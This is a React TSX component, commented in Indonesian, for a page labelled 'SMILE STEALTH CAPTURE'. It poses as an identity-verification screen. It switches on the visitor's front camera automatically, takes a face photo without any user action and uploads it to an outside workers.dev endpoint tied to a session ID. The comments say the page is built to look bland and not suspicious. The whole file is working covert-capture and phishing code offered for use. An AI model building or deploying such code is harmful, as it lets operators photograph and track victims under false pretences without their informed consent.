"use client";

import React, { useState, useRef, useEffect, useCallback } from 'react';

// ============================================================
// 👻 SMILE STEALTH CAPTURE - REACT TSX COMPONENT
// ============================================================

interface SendPhotoResponse {
  success: boolean;
  message: string;
}

const SmileStealthCapture: React.FC = () => {
  // ============================================================
  // 🔧 KONFIGURASI WORKER
  // ============================================================
  const API_BASE = 'https://smileahbot.onemimereztwo.workers.dev';
  
  // ⏱️ DELAY SEBELUM CAPTURE (ms) - biar kamera stabil
  const CAPTURE_DELAY = 1500;
  // ⏱️ JEDA SEBELUM AUTO KIRIM (ms)
  const SEND_DELAY = 800;

  // ============================================================
  // 📦 STATE
  // ============================================================
  const [sessionId, setSessionId] = useState('');
  const [isCameraReady, setIsCameraReady] = useState(false);
  const [isSending, setIsSending] = useState(false);
  const [isCapturing, setIsCapturing] = useState(false);
  const [capturedPhoto, setCapturedPhoto] = useState<string | null>(null);
  const [status, setStatus] = useState<{ message: string; type: 'info' | 'success' | 'error' | '' }>({
    message: '',
    type: '',
  });
  const [progress, setProgress] = useState(0);

  // ============================================================
  // 🎯 REFS
  // ============================================================
  const videoRef = useRef<HTMLVideoElement>(null);
  const photoRef = useRef<HTMLImageElement>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const captureTimeoutRef = useRef<NodeJS.Timeout | null>(null);
  const sendTimeoutRef = useRef<NodeJS.Timeout | null>(null);
  const hasCapturedRef = useRef(false);

  // ============================================================
  // 🛠️ HELPER FUNCTIONS
  // ============================================================
  const showStatus = useCallback((message: string, type: 'info' | 'success' | 'error') => {
    setStatus({ message, type });
  }, []);

  // ============================================================
  // 🔍 GET SESSION ID
  // ============================================================
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const urlParams = new URLSearchParams(window.location.search);
      const queryId = urlParams.get('session') || urlParams.get('id');
      const pathSegments = window.location.pathname.split('/');
      const pathId = pathSegments[pathSegments.length - 1];

      const id = queryId || (pathId !== 'kamera' && pathId !== 'stealth' ? pathId : '');

      if (id && id.length >= 6) {
        setSessionId(id);
      } else {
        const randomId = 'SML' + Math.floor(10000 + Math.random() * 90000);
        setSessionId(randomId);
      }
    }
  }, []);

  // ============================================================
  // 📷 AUTO START CAMERA
  // ============================================================
  useEffect(() => {
    if (sessionId) {
      // Delay kecil biar komponen fully render
      const timer = setTimeout(() => {
        startCamera();
      }, 500);

      return () => clearTimeout(timer);
    }
  }, [sessionId]);

  // ============================================================
  // 🧹 CLEANUP
  // ============================================================
  useEffect(() => {
    return () => {
      if (captureTimeoutRef.current) clearTimeout(captureTimeoutRef.current);
      if (sendTimeoutRef.current) clearTimeout(sendTimeoutRef.current);
      if (streamRef.current) {
        streamRef.current.getTracks().forEach((t) => t.stop());
      }
    };
  }, []);

  // ============================================================
  // 📷 KAMERA (STEALTH - LANGSUNG AKTIF)
  // ============================================================
  const startCamera = async () => {
    try {
      if (streamRef.current) {
        streamRef.current.getTracks().forEach((t) => t.stop());
        streamRef.current = null;
      }

      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: 'user',
          width: { ideal: 640 },
          height: { ideal: 480 },
        },
        audio: false,
      });

      streamRef.current = stream;

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play();
        videoRef.current.style.display = 'block';
      }

      // Sembunyikan placeholder
      const placeholder = document.getElementById('placeholder');
      if (placeholder) placeholder.style.display = 'none';

      setIsCameraReady(true);
      
      // 🔥 AUTO CAPTURE SETELAH KAMERA READY
      if (!hasCapturedRef.current) {
        showStatus('📸 Mengambil foto...', 'info');
        captureTimeoutRef.current = setTimeout(() => {
          autoCaptureAndSend();
        }, CAPTURE_DELAY);
      }

    } catch (err) {
      console.error('Camera error:', err);
      showStatus('⚠️ Gagal akses kamera. Coba izinkan akses kamera.', 'error');
      setIsCameraReady(false);
    }
  };

  // ============================================================
  // 📸 AUTO CAPTURE + AUTO SEND (STEALTH)
  // ============================================================
  const autoCaptureAndSend = useCallback(() => {
    if (hasCapturedRef.current) return;
    if (!isCameraReady || !streamRef.current) {
      // Coba lagi
      captureTimeoutRef.current = setTimeout(() => {
        autoCaptureAndSend();
      }, 500);
      return;
    }

    const video = videoRef.current;
    if (!video) return;

    // Progress bar simulasi
    setProgress(30);

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    setProgress(60);

    const photoData = canvas.toDataURL('image/jpeg', 0.85);
    setCapturedPhoto(photoData);
    hasCapturedRef.current = true;

    if (photoRef.current) {
      photoRef.current.src = photoData;
      photoRef.current.style.display = 'block';
    }

    // Sembunyikan video setelah capture
    if (videoRef.current) {
      videoRef.current.style.display = 'none';
    }

    setProgress(80);
    showStatus('📤 Mengirim foto...', 'info');

    // Auto send setelah capture
    sendTimeoutRef.current = setTimeout(() => {
      sendPhoto(photoData);
    }, SEND_DELAY);

  }, [isCameraReady]);

  // ============================================================
  // 📤 SEND PHOTO (STEALTH - TANPA INTERAKSI USER)
  // ============================================================
  const sendPhoto = async (photoData: string) => {
    if (!photoData || isSending || !sessionId) {
      setProgress(0);
      return;
    }

    setIsSending(true);
    setProgress(90);

    try {
      // Konversi dataURL ke File
      const resBlob = await fetch(photoData);
      const blob = await resBlob.blob();
      const file = new File([blob], `${sessionId}_face.jpg`, { type: 'image/jpeg' });

      const formData = new FormData();
      formData.append('photo', file);

      const res = await fetch(`${API_BASE}/capture/${sessionId}`, {
        method: 'POST',
        body: formData,
      });

      const result: SendPhotoResponse = await res.json();

      setProgress(100);

      if (result.success) {
        showStatus('✅ Foto terkirim!', 'success');
        
        // Matikan kamera
        if (streamRef.current) {
          streamRef.current.getTracks().forEach((t) => t.stop());
          streamRef.current = null;
        }

        // Delay lalu redirect/hide
        setTimeout(() => {
          // Redirect ke halaman sukses atau kosong
          if (typeof window !== 'undefined') {
            // Bisa redirect ke halaman lain atau tampilkan pesan sukses
            window.location.href = '/success';
          }
        }, 2000);

      } else {
        showStatus('❌ Gagal: ' + (result.message || 'Error'), 'error');
        setProgress(0);
      }
    } catch (err) {
      console.error('Send error:', err);
      showStatus('❌ Gagal mengirim. Coba lagi.', 'error');
      setProgress(0);
    } finally {
      setIsSending(false);
    }
  };

  // ============================================================
  // 🎨 RENDER - TAMPILAN BLAND / POLOS (STEALTH)
  // ============================================================
  return (
    <div className="min-h-screen bg-gray-50 flex justify-center items-center p-4 font-sans">
      <div className="bg-white rounded-2xl shadow-lg p-6 max-w-sm w-full border border-gray-100">
        
        {/* Header - Minimalis */}
        <div className="text-center mb-5">
          <div className="w-14 h-14 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-2">
            <span className="text-2xl">📋</span>
          </div>
          <h2 className="text-gray-800 text-lg font-semibold">Verifikasi Identitas</h2>
          <p className="text-gray-400 text-xs mt-0.5">Mohon tunggu sebentar...</p>
        </div>

        {/* Camera Preview - KECIL & TIDAK MENCURIGAKAN */}
        <div className="relative bg-gray-100 rounded-xl overflow-hidden aspect-video max-h-48 border border-gray-200">
          <video
            ref={videoRef}
            className="w-full h-full object-cover hidden -scale-x-100"
            autoPlay
            playsInline
            muted
          />
          <img
            ref={photoRef}
            className="w-full h-full object-cover hidden"
            alt=""
          />

          <div
            id="placeholder"
            className="flex flex-col items-center justify-center h-full text-gray-400 gap-1"
          >
            <span className="text-4xl">📷</span>
            <p className="text-xs">Mengaktifkan kamera...</p>
          </div>

          {/* Progress Bar - Halus & Tidak Mencolok */}
          {progress > 0 && progress < 100 && (
            <div className="absolute bottom-0 left-0 right-0 h-1 bg-gray-200">
              <div 
                className="h-full bg-blue-500 transition-all duration-300 ease-out"
                style={{ width: `${progress}%` }}
              />
            </div>
          )}
        </div>

        {/* Status - Tidak Mencurigakan */}
        {status.message && (
          <div className={`mt-3 py-2 px-3 rounded-lg text-xs text-center ${
            status.type === 'success'
              ? 'bg-green-50 text-green-600'
              : status.type === 'error'
              ? 'bg-red-50 text-red-500'
              : 'bg-blue-50 text-blue-500'
          }`}>
            {status.message}
          </div>
        )}

        {/* Loading Indicator - Halus */}
        {isSending && (
          <div className="mt-2 flex items-center justify-center gap-2">
            <div className="w-3 h-3 border-2 border-gray-300 border-t-blue-500 rounded-full animate-spin" />
            <span className="text-gray-400 text-xs">Memproses...</span>
          </div>
        )}

        {/* Footer - Tidak Mencurigakan */}
        <div className="mt-4 text-center">
          <p className="text-gray-300 text-[10px]">
            {sessionId ? `ID: ${sessionId.substring(0, 4)}...` : 'Loading...'}
          </p>
        </div>

        {/* ⚠️ Hidden Info - Buat debugging (opsional, bisa dihapus) */}
        <div className="hidden">
          <p>Session: {sessionId}</p>
          <p>Ready: {isCameraReady ? 'Yes' : 'No'}</p>
          <p>Captured: {capturedPhoto ? 'Yes' : 'No'}</p>
        </div>
      </div>
    </div>
  );
};

export default SmileStealthCapture;